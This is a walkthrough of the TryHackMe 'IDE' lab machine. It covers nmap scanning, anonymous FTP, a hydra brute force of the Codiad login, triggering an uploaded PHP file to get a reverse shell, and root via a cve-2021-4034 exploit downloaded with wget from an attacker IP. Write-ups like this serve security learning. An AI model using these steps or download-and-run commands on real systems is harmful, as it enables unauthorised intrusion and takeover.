## IDE
https://tryhackme.com/room/ide

## Enum
```
nmap -Pn -sC -sV ip.thm -p- -vv --open
Scanning ip.thm (10.10.161.27) [65535 ports]
Discovered open port 62337/tcp on 10.10.161.27
Discovered open port 22/tcp on 10.10.161.27
Discovered open port 21/tcp on 10.10.161.27
Discovered open port 80/tcp on 10.10.161.27

PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.95.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
62337/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
ftp> open
(to) 10.10.161.27
Connected to 10.10.161.27.
220 (vsFTPd 3.0.3)
Name (): anonymous
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||29379|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||58828|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> get -
local: - remote: -
ftp> exit
221 Goodbye.
```

```
mv - ftp1
file ftp1
ftp1: ASCII text
```
```
cat ftp1
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```
🏴 Username:john,drac / password:default password

![image](https://user-images.githubusercontent.com/6504854/187035021-de5edd9a-0b6a-4b48-baef-256662b4b3c2.png)

![image](https://user-images.githubusercontent.com/6504854/187035512-996a7d76-0ec5-47e5-9c72-6fc6ea95ce93.png)

```
hydra -l john -P /usr/share/wordlists/rockyou.txt ip.thm -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=john&password=^PASS^&theme=default&language=en:Incorrect Username or Password" -v
```

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking http-post-form://ip.thm:62337/components/user/controller.php?action=authenticate:username=john&password=^PASS^&theme=default&language=en:Incorrect Username or Password
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[62337][http-post-form] host: ip.thm   login: john   password: p******
[STATUS] attack finished for ip.thm (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```
🏴 Now I can use jhon's credential.

![image](https://user-images.githubusercontent.com/6504854/187035855-a125a7c7-d1e9-4fc9-b18f-02820a34f249.png)

![image](https://user-images.githubusercontent.com/6504854/187035983-f6dc556f-6472-438b-a6ee-b5a383d0a955.png)

![image](https://user-images.githubusercontent.com/6504854/187035946-c70c124a-3692-419b-8765-dcde0d9396c0.png)

![image](https://user-images.githubusercontent.com/6504854/187036225-d4a3f2ff-8b65-495c-b491-4a12d3d09eff.png)

```
curl ip.thm/codiad_projects/1.php
```
🏴 OK!

## Flag

```
connect to [] from (UNKNOWN) [10.10.224.2] 37910
Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 15:28:14 up 7 min,  0 users,  load average: 0.22, 1.22, 0.83
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off

$ cd /home
$ ls -la
drwxr-xr-x  6 drac drac 4096 Aug  4  2021 drac

$ cd drac
$ ls -la
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
-r-------- 1 drac drac   33 Jun 18  2021 user.txt

$ cat .bash_history
mysql -u drac -p '***********'

$ su drac
su: must be run from a terminal
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ide:/home/drac$ su drac
su drac
Password: 

drac@ide:~$ cat user.txt

$ cd /tmp
$ wget http://10.10.10.10:8081/1.tar
$ tar -xvf 1.tar
./cve-2021-4034
$ ./cve-2021-4034

cat /root/root.txt
```

Thank you for your time. Happy Hacking. 🌞🌞🌞
